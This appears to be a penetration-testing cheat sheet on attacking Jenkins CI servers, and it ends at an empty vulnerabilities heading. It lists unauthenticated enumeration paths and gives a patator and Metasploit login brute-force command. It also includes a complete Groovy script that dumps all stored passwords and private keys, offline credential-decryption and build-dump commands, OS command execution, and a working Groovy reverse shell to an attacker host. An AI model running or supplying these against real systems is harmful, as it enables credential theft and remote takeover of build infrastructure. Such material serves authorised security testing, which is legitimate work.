# Web applications - Software Jenkins

### Overview

`Jenkins` is a free and open source platform designed for facilitating
continuous integration and continuous delivery of software development
projects. It implements building, testing, and deploying capacities and
supports various version control (`Git`, `Apache Subversion`, `Mercurial`,
etc.) and build automation (`Apache Maven`, `Gradle`, `Apache Ant`, etc.)
utilities.  

The building and deploying tasks can be distributed on a `Jenkins Master`
server and one or multiple optional `Jenkins Slave` servers.

### Unauthenticated enumeration

The `Jenkins` web interface may be configured to allow unauthenticated users to
perform a number of actions, ranging from retrieving the `Jenkins` appliance's
configuration to executing `Groovy` script on the `Jenkins Master` and
`Jenkins Slave` servers.

Indeed, the access control of the `Jenkins` appliance
can be configured to `"Anyone can do anything"`, which grant full privileges to
unauthenticated users, or `"Legacy mode"` which gives unauthenticated users
full read access. Additionally, access to individual components can be granted
to `Anonymous Users` through the `Matrix-based security`.  

| Path | Description |
|------|-------------|
| `<URL>/systemInfo/` | Display the appliance configuration. |
| `<URL>/asynchPeople/` | Lists the local users of the appliance. <br/> Accessible to `Anonymous Users` if the authorization is set to `Legacy mode`. |
| `<URL>/view/all/builds` | List the current and past builds. <br/> Accessible to `Anonymous Users` if the authorization is set to `Legacy mode`. |
| `<URL>/view/all/newJob` | Job creation interface. |
| `<URL>/manage` | `Jenkins` management interface. |
| `<URL>/pluginManager/installed` | Lists the `Jenkins` plugins installed. |
| `<URL>/credentials/` | Default path of the `Credentials` plugin, used to manage stored credentials. <br/> Accessible to `Anonymous Users` if the authorization is set to `Legacy mode`. <br/><br/> For more information, refer to the `Build Jobs secrets` section below. |
| `<URL>/script` | The `Script Console`, a `Groovy` script interpreter that can be leveraged to execute code on the `Jenkins` servers. <br/><br/> For more information, refer to the `Code execution on Jenkins servers through the Script Console` section below. |

The `metasploit`'s `auxiliary/scanner/http/jenkins_enum` module attempts, in an
unauthenticated manner, to enumerate the `Jenkins` version and to access a
number of the `URL` above.  

### Authentication brute force

Among others, `Metasploit` and `patator` can be used to brute force the
authentication of a `jenkins` instance through its web interface.

```
# JENKINS_LOGIN_URL: <URL>/j_acegi_security_check

msf > use auxiliary/scanner/http/jenkins_login

patator http_fuzz -t <50 | NUMBER_THREADS> url="<JENKINS_LOGIN_URL>" method=POST body='j_username=FILE0&j_password=FILE1' 0=<WORDLIST_USERS> 1=<WORDLIST_PASSWORDS> -x ignore:fgrep='loginError'
```

### Build Jobs secrets

Various kind of secrets, such as passwords or API keys, can be stored in
`Jenkins` in order to be accessible by `Jenkins`'s `continuous delivery`
builds. As, by design, `Jenkins` must be able to provide clear text
credentials if necessary to the utilities in the pipelines, the secrets are
retrievable given sufficient privileges on the `Jenkins` appliance.

The secrets definition, management and usage are implemented through a number
of `Jenkins` plugins:
  - the `Credentials plugin`, which implements the credentials management
    interface, accessible at the `<URL>/credentials/` URL.
  - the `Credentials Binding plugin`, which allows `Jenkins` build jobs to
    inject credentials directly as environment variables.
  - the `Folders plugin`, which can be used to reduce the accessibility of
    `Credentials` to certain Build Jobs.

The credentials registered through the `Credentials plugin` can either be
defined with one of the following scope:
  - `System`, to be only accessible from the `Jenkins` instance itself and its'
    plugins.
  - `Global`, to be accessible to the `Jenkins` instance as well as to all
    Build Jobs.
  - If the `Folders plugin` is installed, locally to a `Jenkins folder` in
    order to only be accessible to the Build Jobs defined in the folder.

`Credentials` are stored encrypted locally on the `Jenkins` servers through
the following files:
  - `$JENKINS_HOME/credentials.xml`: file that store the encrypted
    `Credentials`.
  - `$JENKINS_HOME/secrets/hudson.util.Secret`: encrypted file that store the
    `AES-128` key used to encrypt the `Credentials` in the `credentials.xml`
    file.
  - `$JENKINS_HOME/secrets/master.key`: plain text key file that contains the
    key to decrypt the `hudson.util.Secret` file.  

###### Credentials dumping through the Script Console

The `Script Console` can be used to execute a `Groovy` script that will
retrieve and decrypt all stored `Credentials`. The permissions to access the
`Script Console` (`Overall/RunScripts`) and to retrieve `Credentials`
(`Credentials/View`) are required.

The `Groovy` script below dumps the username / password and private key
credentials from both the `System` and `Global` scopes as well as credentials
defined locally in `Jenkins folders`.

```
import jenkins.model.*
import com.cloudbees.hudson.plugins.folder.*;
import com.cloudbees.hudson.plugins.folder.properties.*;
import com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider.FolderCredentialsProperty;
import com.cloudbees.plugins.credentials.impl.*;
import com.cloudbees.plugins.credentials.*;
import com.cloudbees.plugins.credentials.domains.*;

// Retrieves the System and Global credentials.
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
  Jenkins.instance,
  null,
  null
);

for (c in creds) {
  if (c.properties.privateKeySource) {
    println((c.properties.privateKeySource ? "ID: " + c.id + ", username: " + c.username + ", private key: " + c.getPrivateKey() : ""))
  }
}

for (c in creds) {
  if (c.properties.password) {
    println((c.properties.password ? "ID: " + c.id + ", username: " + c.username + ", password: " + c.password : ""))
  }
}

// Retrieves the credentials defined through Folders.
def allJenkinsItems = Jenkins.getInstance().getItems();
for (currentJenkinsItem in allJenkinsItems) {
  if(!(currentJenkinsItem instanceof Folder)) { continue }

  currentFolder = (Folder) currentJenkinsItem;

  println ()
  println (currentFolder.getFullName())

  def credsFolders = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    currentFolder,
    null,
    null
  );

  for (c in credsFolders) {
    if (c.properties.scope == CredentialsScope.GLOBAL) { continue }

    if (c.properties.privateKeySource) {
      println((c.properties.privateKeySource ? "ID: " + c.id + ", username: " + c.username + ", private key: " + c.getPrivateKey() : ""))
    }
  }

  for (c in credsFolders) {
    if (c.properties.scope == CredentialsScope.GLOBAL) { continue }

    if (c.properties.password) {
      println((c.properties.password ? "ID: " + c.id + ", username: " + c.username + ", password: " + c.password : ""))
    }
  }
}
```

###### Credentials dumping through code execution on a Jenkins server

If the `credentials.xml`, `hudson.util.Secret` and `master.key` files could be
retrieved from a `Jenkins` server, the credentials can be retrieved using the   
`jenkins_offline_decrypt` `Python` script:

```
jenkins_offline_decrypt.py <MASTER_KEY_FILE> <HUDSON_UTIL_SECRET_FILE> <CREDENTIALS_XML_FILE>
```

###### Credentials leak in Build Jobs

Credentials and secrets may leak in Build Jobs console outputs and environment
variables. Note that the `Mask Passwords Plugin` plugin may be in use to redact
the secrets from the `Console Output` build log.

The `jenkins_dump_builds` Python script can be used to dump all Build jobs
past builds.

```
# Source: https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py

python3 jenkins_dump_builds.py -o <OUTPUT_DIRECTORY> <JENKINS_URL | JENKINS_URL [JENKINS_URL2 ...]>

python3 jenkins_dump_builds.py -o <OUTPUT_DIRECTORY> -u "<USERNAME>" -p "<PASSWORD>" <JENKINS_URL | JENKINS_URL [JENKINS_URL2 ...]>
```

The `grep` or `ngp` utilities can then be used to search for matching keywords
in the dump Build Jobs console outputs and environment variables:

```
grep -rin "<password | KEYWORD>" <OUTPUT_DIRECTORY>

ngp -ri "<password | KEYWORD>" <OUTPUT_DIRECTORY>
```

### Code execution on `Jenkins` servers through the Script Console

The `Jenkins` `Script Console` can be used to execute a `Groovy` script that
will in turn execute operating system commands. Access to the `Script Console`
requires the `Overall/RunScripts` permission (which depending on the access
control of the targeted `Jenkins` appliance can be granted to unauthenticated
users).

The `Script Console`, that will execute code on the current `Jenkins` node, is
accessible at the `<URL>/script` path. Additionally, code can be executed on
a specific `Jenkins` node by accessing the `Script Console` through the
targeted node status page:

```
URL: <URL>/computer/(<master | NODE_NAME>)/script

Or through the interface menus: visit "Manage Jenkins" > "Manage Nodes" > Select the targeted Jenkins node -> "Script Console" (on the left panel).
```

```
# Unitary OS command execution.
def proc = "<COMMAND>".execute(); def os = new StringBuffer(); proc.waitForProcessOutput(os, System.err); println(os.toString());

# Reverse shell in Groovy.
# Source: https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
# BINARY: /bin/sh | /usr/bin/bash | cmd.exe | powershell.exe | ...
String host="<IP | HOSTNAME>";
int port=<PORT>;
String cmd="<BINARY>";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Known critical vulnerabilities
